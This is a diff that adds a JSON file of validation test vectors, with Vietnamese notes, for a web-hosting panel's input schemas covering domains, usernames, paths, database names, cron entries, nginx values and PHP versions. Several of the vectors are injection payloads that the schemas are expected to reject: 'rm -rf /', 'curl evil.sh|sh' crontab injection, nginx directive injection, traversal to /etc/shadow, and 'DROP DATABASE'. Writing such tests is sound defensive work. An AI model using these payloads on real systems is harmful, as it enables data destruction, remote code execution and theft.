@@ -1,0 +1,609 @@
+{
+  "version": 1,
+  "total": 93,
+  "categories": {
+    "domain": {
+      "schema": "agent-ops/defs.schema.json#/$defs/Domain",
+      "vectors": [
+        {
+          "input": "anphat.vn",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Domain hợp lệ"
+        },
+        {
+          "input": "shop.anphat.vn",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Subdomain hợp lệ"
+        },
+        {
+          "input": "xn--bcher-kva.example",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Punycode hợp lệ"
+        },
+        {
+          "input": "example.xn--p1ai",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "TLD punycode"
+        },
+        {
+          "input": "Anphat.VN",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chữ hoa: phải chuẩn hóa chữ thường trước"
+        },
+        {
+          "input": "anphat.vn;rm -rf /",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn lệnh shell"
+        },
+        {
+          "input": "anphat.vn\nserver_name evil.com",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn dòng cấu hình nginx"
+        },
+        {
+          "input": "../etc/passwd",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Path traversal"
+        },
+        {
+          "input": "-anphat.vn",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Nhãn bắt đầu bằng gạch nối"
+        },
+        {
+          "input": "anphat-.vn",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Nhãn kết thúc bằng gạch nối"
+        },
+        {
+          "input": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.vn",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Nhãn dài hơn 63 ký tự"
+        },
+        {
+          "input": "anphat",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Thiếu TLD"
+        },
+        {
+          "input": "192.168.1.10",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Địa chỉ IP thay cho domain"
+        },
+        {
+          "input": "*.anphat.vn",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Wildcard không cho phép ở website"
+        },
+        {
+          "input": "anphat.vn ",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Khoảng trắng thừa"
+        },
+        {
+          "input": "an phat.vn",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Khoảng trắng giữa"
+        },
+        {
+          "input": "anphat.vn.",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Dấu chấm cuối (FQDN) phải bỏ trước"
+        },
+        {
+          "input": "bücher.example",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Unicode chưa chuyển punycode"
+        },
+        {
+          "input": "localhost.localdomain",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "Tên nội bộ bị cấm"
+        },
+        {
+          "input": "admin.itso.local",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "Trùng domain của panel"
+        },
+        {
+          "input": "anphat.vn{}",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Ký tự ngoặc nhọn phá cú pháp nginx"
+        }
+      ]
+    },
+    "username": {
+      "schema": "agent-ops/defs.schema.json#/$defs/Username",
+      "vectors": [
+        {
+          "input": "anphat",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Hợp lệ"
+        },
+        {
+          "input": "mktitso",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Hợp lệ"
+        },
+        {
+          "input": "root",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Username hệ thống"
+        },
+        {
+          "input": "mysql",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Username dịch vụ"
+        },
+        {
+          "input": "itso",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Username của panel"
+        },
+        {
+          "input": "Anphat",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chữ hoa"
+        },
+        {
+          "input": "1anphat",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Bắt đầu bằng số"
+        },
+        {
+          "input": "ab",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Ngắn hơn 3 ký tự"
+        },
+        {
+          "input": "aaaaaaaaaaaaaaaaa",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Dài hơn 16 ký tự"
+        },
+        {
+          "input": "an-phat",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Gạch nối"
+        },
+        {
+          "input": "anphat;id",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn lệnh"
+        },
+        {
+          "input": "www-data",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "User web server"
+        },
+        {
+          "input": "ubuntu",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "User mặc định của cloud image (danh sách cấm mở rộng ở agent)"
+        }
+      ]
+    },
+    "path": {
+      "schema": "agent-ops/defs.schema.json#/$defs/RelPath",
+      "vectors": [
+        {
+          "input": ".",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Gốc home"
+        },
+        {
+          "input": "sites/anphat.vn/public/index.php",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Đường dẫn tương đối hợp lệ"
+        },
+        {
+          "input": ".env",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "File ẩn hợp lệ"
+        },
+        {
+          "input": "sites/anphat.vn/.well-known/acme-challenge/x",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Thư mục ẩn hợp lệ"
+        },
+        {
+          "input": "/etc/shadow",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Đường dẫn tuyệt đối"
+        },
+        {
+          "input": "../other/secret",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Thoát lên thư mục cha"
+        },
+        {
+          "input": "sites/../../etc/passwd",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Traversal giữa đường dẫn"
+        },
+        {
+          "input": "sites/..",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Kết thúc bằng .."
+        },
+        {
+          "input": "sites/./x",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Đoạn . không chuẩn hóa"
+        },
+        {
+          "input": "sites//x",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Hai dấu gạch chéo liên tiếp"
+        },
+        {
+          "input": "sites/x\u0000.php",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Ký tự NUL"
+        },
+        {
+          "input": "sites/x\n.php",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Ký tự xuống dòng"
+        },
+        {
+          "input": "",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Rỗng"
+        },
+        {
+          "input": "sites/",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Kết thúc bằng gạch chéo"
+        },
+        {
+          "input": "sites/link-to-root/etc",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "Symlink trỏ ra ngoài home: agent kiểm sau khi resolve (openat2 RESOLVE_BENEATH)"
+        },
+        {
+          "input": "..%2f..%2fetc%2fpasswd",
+          "expect": "accept",
+          "layer": "semantic",
+          "note": "Chuỗi URL-encoded là tên file hợp lệ; API không được decode hai lần"
+        }
+      ]
+    },
+    "db_name": {
+      "schema": "agent-ops/defs.schema.json#/$defs/DbName",
+      "vectors": [
+        {
+          "input": "anphat_web",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Hợp lệ"
+        },
+        {
+          "input": "anphat_shop2",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Có số"
+        },
+        {
+          "input": "anphat-web",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Gạch nối"
+        },
+        {
+          "input": "anphat_web; DROP DATABASE mysql",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "SQL injection"
+        },
+        {
+          "input": "`anphat`",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Backtick"
+        },
+        {
+          "input": "Anphat_web",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chữ hoa"
+        },
+        {
+          "input": "_anphat",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Bắt đầu bằng gạch dưới"
+        },
+        {
+          "input": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Dài hơn 64 ký tự"
+        },
+        {
+          "input": "mysql",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "DB hệ thống"
+        },
+        {
+          "input": "information_schema",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "DB hệ thống"
+        },
+        {
+          "input": "other_web",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "Không có tiền tố username của account"
+        }
+      ]
+    },
+    "cron_expr": {
+      "schema": "agent-ops/defs.schema.json#/$defs/CronExpr",
+      "vectors": [
+        {
+          "input": "*/15 * * * *",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Mỗi 15 phút"
+        },
+        {
+          "input": "0 2 * * *",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "2 giờ sáng"
+        },
+        {
+          "input": "0 0 1 1-12/3 *",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Theo quý"
+        },
+        {
+          "input": "* * * * *",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "Mỗi phút: vượt cron_min_interval_min (5) của gói"
+        },
+        {
+          "input": "@reboot",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Từ khóa đặc biệt không cho phép"
+        },
+        {
+          "input": "* * * * * root rm -rf /",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Trường thừa (định dạng /etc/crontab)"
+        },
+        {
+          "input": "*/5 * * * *\n* * * * * curl evil.sh|sh",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn dòng crontab"
+        },
+        {
+          "input": "0 2 * *",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Thiếu trường"
+        },
+        {
+          "input": "0 2 * * MON",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Tên thứ (chỉ cho phép dạng số)"
+        },
+        {
+          "input": "99 2 * * *",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "Giá trị ngoài miền (phút 0–59): parser nghiệp vụ kiểm"
+        }
+      ]
+    },
+    "cron_command": {
+      "schema": "agent-ops/defs.schema.json#/$defs/CronCommand",
+      "vectors": [
+        {
+          "input": "php artisan schedule:run",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Hợp lệ"
+        },
+        {
+          "input": "/usr/bin/php8.3 bin/cleanup.php --days=7",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Hợp lệ"
+        },
+        {
+          "input": "php a.php\n* * * * * curl evil.sh|sh",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn dòng crontab"
+        },
+        {
+          "input": "php a.php\r",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Ký tự CR"
+        },
+        {
+          "input": "",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Rỗng"
+        },
+        {
+          "input": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Quá dài"
+        }
+      ]
+    },
+    "nginx_size": {
+      "schema": "agent-ops/defs.schema.json#/$defs/NginxSize",
+      "vectors": [
+        {
+          "input": "64m",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Hợp lệ"
+        },
+        {
+          "input": "1g",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Hợp lệ"
+        },
+        {
+          "input": "64m; include /etc/shadow",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn directive"
+        },
+        {
+          "input": "64M",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chữ hoa (chuẩn hóa trước)"
+        },
+        {
+          "input": "-1",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Số âm"
+        },
+        {
+          "input": "64mb",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Đơn vị không hợp lệ"
+        }
+      ]
+    },
+    "header_value": {
+      "schema": "agent-ops/defs.schema.json#/$defs/HeaderValue",
+      "vectors": [
+        {
+          "input": "SAMEORIGIN",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Hợp lệ"
+        },
+        {
+          "input": "max-age=31536000, includeSubDomains",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Hợp lệ"
+        },
+        {
+          "input": "x; add_header Set-Cookie evil",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn directive bằng ;"
+        },
+        {
+          "input": "x }\nserver { listen 80;",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Phá khối cấu hình"
+        },
+        {
+          "input": "$request_uri",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Biến nginx"
+        },
+        {
+          "input": "x\" always",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Thoát chuỗi"
+        }
+      ]
+    },
+    "php_version": {
+      "schema": "agent-ops/defs.schema.json#/$defs/PhpVersion",
+      "vectors": [
+        {
+          "input": "8.3",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Hợp lệ"
+        },
+        {
+          "input": "8.3; rm -rf /",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn lệnh"
+        },
+        {
+          "input": "../8.3",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Traversal tới socket khác"
+        },
+        {
+          "input": "7.4",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "Phiên bản không có trong gói/không được cài"
+        }
+      ]
+    }
+  }
+}
